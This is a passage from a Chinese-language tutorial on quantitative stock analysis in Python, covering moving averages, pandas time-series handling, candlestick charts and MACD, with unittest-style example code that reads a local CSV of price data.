<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[生成权重] --&gt; B[卷积运算]</span><br><span class="line">    B --&gt; C[均线可视化]</span><br></pre></td></tr></table></figure>

<p><strong>指标移动均线</strong>：历史数据的<strong>权重</strong>以<strong>指标速度衰减</strong>，计算股价与权重衰减的指标函数的卷积。对近期价格给予更高的权重，反映了市场更近期的变化。计算指数移动平均线时，当前价格会根据选定的时间段和权重系数，与之前的移动平均线值相结合。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[权重初始化] --&gt; B[权重衰减]</span><br><span class="line">    B --&gt; C[卷积运算]</span><br><span class="line">    C --&gt; D[均线可视化]</span><br></pre></td></tr></table></figure>

<p><strong>应用</strong>：</p>
<ul>
<li><strong>确定趋势</strong>：投资者可以使用不同期限的移动平均线来确定趋势的强度和方向。</li>
<li><strong>交叉信号</strong>：移动平均线的交叉可以提供买入或卖出的信号。</li>
<li><strong>支撑与阻力线</strong>：移动平均线经常被用作支撑和阻力线的参考。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestNumpyMA</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 简单移动均线</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testSMA</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&quot;,&quot;</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>),</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(end_price)</span><br><span class="line">        <span class="comment"># 这里为什么这么算</span></span><br><span class="line">        N=<span class="number">5</span></span><br><span class="line">        weights = np.ones(N) / N</span><br><span class="line">        <span class="built_in">print</span>(weights)</span><br><span class="line"></span><br><span class="line">        sma = np.convolve(weights,end_price)[N-<span class="number">1</span>:-N+<span class="number">1</span>] <span class="comment">#从N-1到-(N-1)</span></span><br><span class="line">        <span class="built_in">print</span>(sma) <span class="comment"># 5日均线</span></span><br><span class="line"></span><br><span class="line">        plt.plot(sma,linewidth=<span class="number">5</span>)</span><br><span class="line">        <span class="comment">#plt.show()</span></span><br><span class="line">        <span class="comment"># plt.draw()</span></span><br><span class="line">        <span class="comment"># plt.pause()  # 短暂暂停确保绘图完成</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 卷积</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testEXP</span>(<span class="params">self</span>):</span><br><span class="line">        x = np.arange(<span class="number">5</span>)</span><br><span class="line">        y = np.arange(<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x&quot;</span>,x) <span class="comment"># exp 函数可以计算出每个数组元素的指数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;y&quot;</span>,y)</span><br><span class="line">        <span class="comment"># 指数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;Exp x : <span class="subst">&#123;np.exp(x)&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;Exp y : <span class="subst">&#123;np.exp(y)&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment"># 线性衰减</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;LineSpace : <span class="subst">&#123;np.linspace(-<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>)&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 指数移动均线</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testEMA</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price,volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&quot;,&quot;</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>,<span class="number">6</span>),</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(end_price)</span><br><span class="line">        N = <span class="number">5</span></span><br><span class="line">        weighs = np.exp(np.linspace(-<span class="number">1</span>,<span class="number">0</span>,N))</span><br><span class="line">        weighs /= weighs.<span class="built_in">sum</span>() <span class="comment">#weighs.sum()</span></span><br><span class="line">        <span class="built_in">print</span>(weighs)</span><br><span class="line">        ema = np.convolve(weighs,end_price)[N-<span class="number">1</span>:-N+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(ema)</span><br><span class="line"></span><br><span class="line">        t = np.arange(N-<span class="number">1</span>,<span class="built_in">len</span>(end_price))</span><br><span class="line">        plt.plot(t,end_price[N-<span class="number">1</span>:],lw=<span class="number">1.0</span>)</span><br><span class="line">        plt.plot(t,ema,lw=<span class="number">2.0</span>)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;++++++++=============++++++++&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure>

<h1 id="Pandas实战"><a href="#Pandas实战" class="headerlink" title="Pandas实战"></a>Pandas实战</h1><h2 id="股票时间序列"><a href="#股票时间序列" class="headerlink" title="股票时间序列"></a>股票时间序列</h2><p><strong>时间序列</strong>：金融领域最重要的数据类型之一，股价、汇率为常见的时间序列数据</p>
<p><strong>趋势分析</strong>：**主要分析时间序列在某一方向上持续运动。**在量化交易领域，我们通过统计手段对投资品的收益率进行时间序列建模，以此来预测未来的收益率并产生交易信号。</p>
<p><strong>序列相关性</strong>：金融时间序列的一个最重要特征是序列相关性。  以投资品的收益率序列为例，我们会经常观察到一段时间内的收益率呈现一定的相关性。</p>
<p><strong>pandas时间序列函数：</strong></p>
<ul>
<li>datetime——时间序列最常用的数据类型，方便进行各种时间类型运算</li>
<li>loc——Pandas中对DataFrame进行筛选的函数，相当于SQL中的where</li>
<li>groupby——Pandas中对数据分组函数，相当于SQL中的GroupBy</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestPandasStock</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="comment">#读取文件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testPandasFile</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(df.info())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-----------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(df.describe())</span><br><span class="line"></span><br><span class="line">    <span class="comment">#时间处理</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testTime</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;vol&#x27;</span>]</span><br><span class="line">        <span class="comment">#单独处理时间类型</span></span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        df[<span class="string">&quot;year&quot;</span>] = df[<span class="string">&quot;trade_date&quot;</span>].dt.year</span><br><span class="line">        df[<span class="string">&quot;month&quot;</span>] = df[<span class="string">&quot;trade_date&quot;</span>].dt.month</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最低收盘价</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testCloseMin</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;col&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;close min : <span class="subst">&#123;df[<span class="string">&#x27;close&#x27;</span>].<span class="built_in">min</span>()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;close min index : <span class="subst">&#123;df[<span class="string">&#x27;close&#x27;</span>].idxmin()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;close min frame : <span class="subst">&#123;df.loc[df[<span class="string">&#x27;close&#x27;</span>].idxmin()]&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每月的平均收盘价和开盘价</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testMean</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;col&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])</span><br><span class="line">        df[<span class="string">&quot;month&quot;</span>] = df[<span class="string">&quot;trade_date&quot;</span>].dt.month</span><br><span class="line">        <span class="comment">#每月平均收盘价</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;month close mean : <span class="subst">&#123;df.groupby(<span class="string">&quot;month&quot;</span>)[<span class="string">&#x27;close&#x27;</span>].mean()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="comment">#每月平均开盘价</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;month open mean : <span class="subst">&#123;df.groupby(<span class="string">&quot;month&quot;</span>)[<span class="string">&#x27;open&#x27;</span>].mean()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 涨跌幅</span></span><br><span class="line">    <span class="comment"># 涨跌幅计算今日收盘价减去昨日收盘价</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testRipples_ratio</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;col&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])</span><br><span class="line">        df[<span class="string">&quot;rise&quot;</span>] = df[<span class="string">&quot;close&quot;</span>].diff() <span class="comment"># rise列</span></span><br><span class="line">        df[<span class="string">&quot;rise_ratio&quot;</span>] = df[<span class="string">&quot;rise&quot;</span>] / df.shift(<span class="number">1</span>)[<span class="string">&quot;close&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h2 id="K线图"><a href="#K线图" class="headerlink" title="K线图"></a>K线图</h2><p>三种K线图：K线图、K线图带交易量、K线图带交易量和均线5和10日</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mplfinance.original_flavor <span class="keyword">import</span> candlestick2_ohlc</span><br><span class="line"><span class="keyword">import</span> mplfinance <span class="keyword">as</span> mpf</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestPandasKLine</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="comment">#读取股票数据，画出K线图</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testKLineChart</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;vol&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        fig = plt.figure()</span><br><span class="line">        axes = fig.add_subplot(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关键修改3：使用正确的参数格式</span></span><br><span class="line">        candlestick2_ohlc(ax=axes, opens=df[<span class="string">&quot;open&quot;</span>].values,closes=df[<span class="string">&quot;close&quot;</span>].values,highs=df[<span class="string">&quot;high&quot;</span>].values,</span><br><span class="line">                          lows=df[<span class="string">&quot;low&quot;</span>].values,width=<span class="number">0.75</span>,colorup=<span class="string">&#x27;red&#x27;</span>, colordown=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        plt.xticks(<span class="built_in">range</span>(<span class="built_in">len</span>(df.index.values)), df.index.values, rotation=<span class="number">30</span>)</span><br><span class="line">        axes.grid(<span class="literal">True</span>)<span class="comment">#网格图</span></span><br><span class="line">        plt.title(<span class="string">&quot;K-Line&quot;</span>)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#k线图带交易量</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testKLineByVolume</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&quot;trade_date&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>, <span class="string">&quot;close&quot;</span>,<span class="string">&quot;volume&quot;</span>]]</span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])<span class="comment">#给时间转一下类型</span></span><br><span class="line">        df = df.set_index(<span class="string">&#x27;trade_date&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        my_color = mpf.make_marketcolors(</span><br><span class="line">            up = <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">            down = <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">            wick = <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">            volume = &#123;<span class="string">&#x27;up&#x27;</span>:<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;down&#x27;</span>:<span class="string">&#x27;green&#x27;</span>&#125;,</span><br><span class="line">            ohlc = <span class="string">&#x27;i&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        my_style = mpf.make_mpf_style(</span><br><span class="line">            marketcolors=my_color,</span><br><span class="line">            gridaxis=<span class="string">&#x27;both&#x27;</span>,</span><br><span class="line">            gridstyle=<span class="string">&#x27;-.&#x27;</span>,<span class="comment">#网格线种类</span></span><br><span class="line">            rc = &#123;<span class="string">&#x27;font.family&#x27;</span>:<span class="string">&#x27;STSong&#x27;</span>&#125;<span class="comment">#字体</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        mpf.plot(</span><br><span class="line">            df,</span><br><span class="line">            <span class="built_in">type</span> = <span class="string">&#x27;candle&#x27;</span>,</span><br><span class="line">            title = <span class="string">&#x27;K-Line&#x27;</span>,</span><br><span class="line">            ylabel = <span class="string">&#x27;price&#x27;</span>,<span class="comment">#y轴</span></span><br><span class="line">            style = my_style,</span><br><span class="line">            show_nontrading = <span class="literal">False</span>,</span><br><span class="line">            volume = <span class="literal">True</span>,</span><br><span class="line">            ylabel_lower = <span class="string">&#x27;volume&#x27;</span>,</span><br><span class="line">            datetime_format = <span class="string">&#x27;%Y-%m-%d&#x27;</span>,</span><br><span class="line">            xrotation = <span class="number">45</span>,</span><br><span class="line">            linecolor = <span class="string">&#x27;#00ff00&#x27;</span>,</span><br><span class="line">            tight_layout = <span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment">#K线图带交易量及均线</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testKLineByMA</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&quot;trade_date&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;volume&quot;</span>]]</span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])  <span class="comment"># 给时间转一下类型</span></span><br><span class="line">        df = df.set_index(<span class="string">&#x27;trade_date&#x27;</span>)</span><br><span class="line">        <span class="comment">#color和style与上面相同</span></span><br><span class="line">        my_color = mpf.make_marketcolors(</span><br><span class="line">            up = <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">            down = <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">            wick = <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">            volume = &#123;<span class="string">&#x27;up&#x27;</span>:<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;down&#x27;</span>:<span class="string">&#x27;green&#x27;</span>&#125;,</span><br><span class="line">            ohlc = <span class="string">&#x27;i&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        my_style = mpf.make_mpf_style(</span><br><span class="line">            marketcolors=my_color,</span><br><span class="line">            gridaxis=<span class="string">&#x27;both&#x27;</span>,</span><br><span class="line">            gridstyle=<span class="string">&#x27;-.&#x27;</span>,<span class="comment">#网格线种类</span></span><br><span class="line">            rc = &#123;<span class="string">&#x27;font.family&#x27;</span>:<span class="string">&#x27;STSong&#x27;</span>&#125;<span class="comment">#字体</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        mpf.plot(</span><br><span class="line">            df,</span><br><span class="line">            <span class="built_in">type</span> = <span class="string">&#x27;candle&#x27;</span>,</span><br><span class="line">            mav = [<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">            title = <span class="string">&#x27;K-Line&#x27;</span>,</span><br><span class="line">            ylabel = <span class="string">&#x27;price&#x27;</span>,  <span class="comment"># y轴</span></span><br><span class="line">            style = my_style,</span><br><span class="line">            show_nontrading = <span class="literal">False</span>,</span><br><span class="line">            volume = <span class="literal">True</span>,</span><br><span class="line">            ylabel_lower = <span class="string">&#x27;volume&#x27;</span>,</span><br><span class="line">            datetime_format = <span class="string">&#x27;%Y-%m-%d&#x27;</span>,</span><br><span class="line">            xrotation = <span class="number">45</span>,</span><br><span class="line">            linecolor = <span class="string">&#x27;#00ff00&#x27;</span>,</span><br><span class="line">            tight_layout = <span class="literal">False</span>,</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<h1 id="Matplotlib实战"><a href="#Matplotlib实战" class="headerlink" title="Matplotlib实战"></a>Matplotlib实战</h1><h2 id="MACD"><a href="#MACD" class="headerlink" title="MACD"></a>MACD</h2><p>MACD意为异同移动平均线。它刻画的是<strong>股价变化速率</strong></p>
<p>构成：白色线代表快线DIF，黄色线代表慢线DEA，零轴，红色柱体，绿色柱体</p>
<table>
<thead>
<tr>
<th>指标</th>
<th>含义</th>
<th>公式</th>
</tr>
</thead>
<tbody><tr>
<td>短期EMA</td>
<td>短期收益率指标移动均线（12天）</td>
<td>前一日EMA(12)<em>11&#x2F;13 + 今日收益率</em>2&#x2F;13</td>
</tr>
<tr>
<td>长期EMA</td>
<td>长期收益率指标移动均线（26天）</td>
<td>前一日EMA(26)<em>25&#x2F;27 + 今日收益率</em>2&#x2F;27</td>
</tr>
<tr>
<td>DIF</td>
<td>短期EMA与长期EMA差值</td>
<td>EMA(12) - EMA(26)</td>
</tr>
<tr>
<td>DEA</td>
<td>DIF线的M日指数移动均线</td>
<td>前一日DEA*8&#x2F;10 + 今日</td>
</tr>
<tr>
<td>MACD</td>
<td>DIF线与DEA线的差 * 2</td>
<td>(DIF - DEA) * 2</td>
</tr>
</tbody></table>
<p>**ewm:**Pandas中指数加权移动窗口函数，采用ewm函数+mean()快捷计算MACD</p>
<p>**bar:**Matplotlib柱状图函数，高校绘制MACD中的柱状图</p>
<p>code:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> colors <span class="keyword">as</span> mycolors</span><br><span class="line"><span class="keyword">from</span> matplotlib.collections <span class="keyword">import</span> LineCollection,PolyCollection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestMatplotlibMACD</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_macd</span>(<span class="params">self,df,fastperiod=<span class="number">12</span>, slowperiod=<span class="number">26</span>, signalperiod=<span class="number">9</span></span>):</span><br><span class="line">        <span class="comment">#短期移动均线</span></span><br><span class="line">        ewma12 = df[<span class="string">&#x27;close&#x27;</span>].ewm(span=fastperiod, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">        <span class="comment">#长期移动均线</span></span><br><span class="line">        ewma26 = df[<span class="string">&#x27;close&#x27;</span>].ewm(span=slowperiod, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;dif&#x27;</span>] = ewma12 - ewma26</span><br><span class="line">        df[<span class="string">&#x27;dea&#x27;</span>] = df[<span class="string">&#x27;dif&#x27;</span>].ewm(span=signalperiod, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">        df[<span class="string">&#x27;bar&#x27;</span>] = (df[<span class="string">&#x27;dif&#x27;</span>] - df[<span class="string">&#x27;dea&#x27;</span>]) * <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_macd</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]</span><br><span class="line">        df = df[[<span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;volume&#x27;</span>]]</span><br><span class="line">        df[<span class="string">&quot;trade_date&quot;</span>] = pd.to_datetime(df[<span class="string">&quot;trade_date&quot;</span>])</span><br><span class="line"></span><br><span class="line">        df_macd = <span class="variable language_">self</span>.cal_macd(df)</span><br><span class="line">        <span class="built_in">print</span>(df_macd)</span><br><span class="line">        <span class="comment">#声明画布</span></span><br><span class="line">        plt.figure()</span><br><span class="line">        df_macd[<span class="string">&#x27;dea&#x27;</span>].plot(color=<span class="string">&#x27;red&#x27;</span>,label=<span class="string">&#x27;dea&#x27;</span>) <span class="comment"># 多头</span></span><br><span class="line">        df_macd[<span class="string">&#x27;dif&#x27;</span>].plot(color=<span class="string">&#x27;blue&#x27;</span>,label=<span class="string">&#x27;dif&#x27;</span>)</span><br><span class="line">        plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">        <span class="comment">#画图</span></span><br><span class="line">        pos_bar = []</span><br><span class="line">        pos_index = []</span><br><span class="line">        neg_bar = []</span><br><span class="line">        neg_index = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> index,row <span class="keyword">in</span> df_macd.iterrows():</span><br><span class="line">            <span class="keyword">if</span>(row[<span class="string">&#x27;bar&#x27;</span>] &gt; <span class="number">0</span>):</span><br><span class="line">                pos_bar.append(row[<span class="string">&#x27;bar&#x27;</span>])</span><br><span class="line">                pos_index.append(index)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                neg_bar.append(row[<span class="string">&#x27;bar&#x27;</span>])</span><br><span class="line">                neg_index.append(index)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 大于0用红色</span></span><br><span class="line">        plt.bar(pos_index,pos_bar,width=<span class="number">0.5</span>,color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        <span class="comment"># 小于0用绿色</span></span><br><span class="line">        plt.bar(neg_index,neg_bar,width=<span class="number">0.5</span>,color=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        major_index = df_macd.index[df_macd.index]</span><br><span class="line">        major_xtics = df_macd[<span class="string">&#x27;trade_date&#x27;</span>][df_macd.index]</span><br><span class="line">        plt.xticks(major_index,major_xtics)</span><br><span class="line">        plt.setp(plt.gca().get_xticklabels(), rotation=<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">        plt.grid(linestyle=<span class="string">&#x27;-.&#x27;</span>)</span><br><span class="line">        plt.title(<span class="string">&#x27;MACD&#x27;</span>)</span><br><span class="line">        plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="KDJ"><a href="#KDJ" class="headerlink" title="KDJ"></a>KDJ</h2><p>KDJ叫<strong>随机指标</strong>。通过<strong>价格波动的真实波幅来反映价格走势的强弱和超买超卖现象</strong>。在价格尚上涨或下降之前，发出买信号的一种技术分析指标，适用于<strong>短期行情</strong>走势分析。</p>
<table>
<thead>
<tr>
<th>指标</th>
<th>含义</th>
<th>公式</th>
</tr>
